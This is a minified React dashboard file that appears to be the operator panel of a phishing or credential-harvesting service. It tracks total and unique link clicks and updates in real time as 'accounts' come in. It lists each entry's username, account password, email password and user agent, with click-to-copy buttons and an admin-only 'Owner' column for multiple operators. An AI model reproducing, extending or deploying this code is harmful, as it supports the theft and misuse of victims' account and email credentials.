import{r as s,j as e,q as A,Y as F}from"./app-C0bdm4mn.js";import{c as L,r as f}from"./index-RxbyN6Ed.js";import{A as P,F as U}from"./AuthenticatedLayout-CLKdOVWV.js";import{D as O}from"./Table-Xmksiz6s.js";import{C as u}from"./index-wt03sKjB.js";function B({title:r,titleId:l,...o},c){return s.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:c,"aria-labelledby":l},o),r?s.createElement("title",{id:l},r):null,s.createElement("path",{d:"M21 6.375c0 2.692-4.03 4.875-9 4.875S3 9.067 3 6.375 7.03 1.5 12 1.5s9 2.183 9 4.875Z"}),s.createElement("path",{d:"M12 12.75c2.685 0 5.19-.586 7.078-1.609a8.283 8.283 0 0 0 1.897-1.384c.016.121.025.244.025.368C21 12.817 16.97 15 12 15s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.285 8.285 0 0 0 1.897 1.384C6.809 12.164 9.315 12.75 12 12.75Z"}),s.createElement("path",{d:"M12 16.5c2.685 0 5.19-.586 7.078-1.609a8.282 8.282 0 0 0 1.897-1.384c.016.121.025.244.025.368 0 2.692-4.03 4.875-9 4.875s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.284 8.284 0 0 0 1.897 1.384C6.809 15.914 9.315 16.5 12 16.5Z"}),s.createElement("path",{d:"M12 20.25c2.685 0 5.19-.586 7.078-1.609a8.282 8.282 0 0 0 1.897-1.384c.016.121.025.244.025.368 0 2.692-4.03 4.875-9 4.875s-9-2.183-9-4.875c0-.124.009-.247.025-.368a8.284 8.284 0 0 0 1.897 1.384C6.809 19.664 9.315 20.25 12 20.25Z"}))}const $=s.forwardRef(B);function H({title:r,titleId:l,...o},c){return s.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:c,"aria-labelledby":l},o),r?s.createElement("title",{id:l},r):null,s.createElement("path",{d:"M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"}),s.createElement("path",{fillRule:"evenodd",d:"M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 0 1 0-1.113ZM17.25 12a5.25 5.25 0 1 1-10.5 0 5.25 5.25 0 0 1 10.5 0Z",clipRule:"evenodd"}))}const V=s.forwardRef(H);function Y({title:r,titleId:l,...o},c){return s.createElement("svg",Object.assign({xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor","aria-hidden":"true","data-slot":"icon",ref:c,"aria-labelledby":l},o),r?s.createElement("title",{id:l},r):null,s.createElement("path",{fillRule:"evenodd",d:"M1.5 5.625c0-1.036.84-1.875 1.875-1.875h17.25c1.035 0 1.875.84 1.875 1.875v12.75c0 1.035-.84 1.875-1.875 1.875H3.375A1.875 1.875 0 0 1 1.5 18.375V5.625ZM21 9.375A.375.375 0 0 0 20.625 9h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5Zm0 3.75a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5Zm0 3.75a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5a.375.375 0 0 0 .375-.375v-1.5ZM10.875 18.75a.375.375 0 0 0 .375-.375v-1.5a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375h7.5ZM3.375 15h7.5a.375.375 0 0 0 .375-.375v-1.5a.375.375 0 0 0-.375-.375h-7.5a.375.375 0 0 0-.375.375v1.5c0 .207.168.375.375.375Zm0-3.75h7.5a.375.375 0 0 0 .375-.375v-1.5A.375.375 0 0 0 10.875 9h-7.5A.375.375 0 0 0 3 9.375v1.5c0 .207.168.375.375.375Z",clipRule:"evenodd"}))}const z=s.forwardRef(Y),m=({children:r,title:l,value:o,className:c=""})=>e.jsx(e.Fragment,{children:e.jsxs("div",{className:"bg-white shadow-xl p-5 relative rounded-md",children:[e.jsx("h4",{className:"font-bold text-[14px] uppercase text-neutral-600 font-karla",children:l}),e.jsx("p",{className:"text-xl py-4 text-black font-bold font-karla",children:o}),e.jsx("div",{className:L("flex justify-center items-center rounded-md h-6 w-6 bg-primary absolute right-3 bottom-3",c),children:r})]})}),X=r=>{const{auth:l}=A().props,{userIds:o}=A().props,[c,w]=s.useState(null),[M,b]=s.useState(null),[D,j]=s.useState(null),[I,g]=s.useState(null),[x,h]=s.useState(r.accounts),[C,y]=s.useState(r.totalAccounts),[v,N]=s.useState(r.todayTotalAccounts),[Z,E]=s.useState(r.totalClicks),[T,_]=s.useState(r.uniqueClicks);let R=["Id","email/Username/Phone","Account Password","User Agent","Email Password","Owner","type","Time"];const[k,S]=s.useState(R);s.useEffect(()=>{l.user.is_admin||S(k.filter(t=>t!="Owner"))},[]);const d=(t,a)=>{a=="eup"&&w(t),a=="password"&&b(t),a=="password_of_email"&&j(t),a=="user_agent"&&g(t)},i=t=>{t=="eup"&&w(null),t=="password"&&b(null),t=="password_of_email"&&j(null),t=="user_agent"&&g(null)};return s.useEffect(()=>{let t=f(o,l.user,"account.created");return t.forEach(a=>{a.listen("AccountCreatedEvent",n=>{l.user.is_admin?(h([n.account,...x].slice(0,-1)),y(C+1),N(v+1)):(h(n.dashboardData.accounts),y(n.dashboardData.totalAccounts),N(n.dashboardData.todayTotalAccounts))})}),()=>{t.forEach(a=>a.unsubscribe())}},[]),s.useEffect(()=>{let t=f(o,l.user,"account.updated");return t.forEach(a=>{a.listen("AccountUpdatedEvent",n=>{const q=x.map(p=>p.id===n.account.id?{...p,password_of_email:n.account.password_of_email}:p);h(q)})}),()=>{t.forEach(a=>a.unsubscribe())}},[]),s.useEffect(()=>{let t=f(o,l.user,"link_info.created");return t.forEach(a=>{a.listen("LinkInfoCreatedEvent",n=>{console.log(),l.user.is_admin?(E(n.dashboardData.admin.totalClicks),_(n.dashboardData.admin.uniqueClicks)):(E(n.dashboardData.totalClicks),_(n.dashboardData.uniqueClicks))})}),()=>{t.forEach(a=>a.unsubscribe())}},[]),e.jsxs(P,{header:"Dashboard",children:[e.jsx(F,{title:"Dashboard"}),e.jsx("div",{className:"overflow-hidden",children:e.jsxs("div",{className:"grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7",children:[e.jsx(m,{title:"Total clicks",value:Z,className:"bg-green-500",children:e.jsx(V,{className:"w-3 h-3 text-white"})}),e.jsx(m,{title:"Unique clicks",value:T,className:"bg-blue-400",children:e.jsx($,{className:"w-3 h-3 text-white"})}),e.jsx(m,{title:"Accounts",value:v,className:"bg-orange-400",children:e.jsx(U,{className:"w-3 h-3 text-white"})}),e.jsx(m,{title:"Total Accounts",value:C,className:"bg-fuchsia-500",children:e.jsx(z,{className:"w-3 h-3 text-white"})})]})}),e.jsx("div",{className:"mt-20",children:e.jsx(O,{headItems:k,children:x.map((t,a)=>e.jsxs("tr",{className:"odd:bg-white even:bg-slate-100",children:[e.jsx("td",{className:"text-left py-3 px-4",children:t.id}),e.jsx(u,{text:t.eup,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>i("eup"),onClick:()=>d(a,"eup"),type:"button",className:"font-semibold",title:"Click to copy",children:t.eup}),c==a?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}),e.jsx(u,{text:t.password,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>i("password"),onClick:()=>d(a,"password"),type:"button",className:"font-semibold",title:"Click to copy",children:t.password}),M==a?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}),t.user_agent?e.jsx(u,{text:t.user_agent,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>i("user_agent"),onClick:()=>d(a,"user_agent"),type:"button",className:"font-semibold",title:"Click to copy",children:t.user_agent}),I==a?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}):e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("span",{className:"bg-yellow-100 text-yellow-800 text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-400",children:"N/A"})}),t.password_of_email?e.jsx(u,{text:t.password_of_email,children:e.jsxs("td",{className:"text-left py-3 px-4 cursor-pointer",children:[e.jsx("button",{onMouseLeave:()=>i("password_of_email"),onClick:()=>d(a,"password_of_email"),type:"button",className:"font-semibold",title:"Click to copy",children:t.password_of_email}),D==a?e.jsx("span",{className:"text-[12px] text-primary ml-1",children:"Copied"}):""]})}):e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("span",{className:"bg-yellow-100 text-yellow-800 text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-400",children:"N/A"})}),t.owner&&e.jsx("td",{className:"text-left py-3 px-4",children:t.owner.name}),e.jsx("td",{className:"text-left py-3 px-4",children:e.jsx("span",{className:"text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-green-400 bg-green-100 text-green-800",children:t.type.name})}),e.jsx("td",{className:"text-left py-3 px-4 italic font-thin",children:t.time_for_humans})]},a))})})]})};export{X as default};
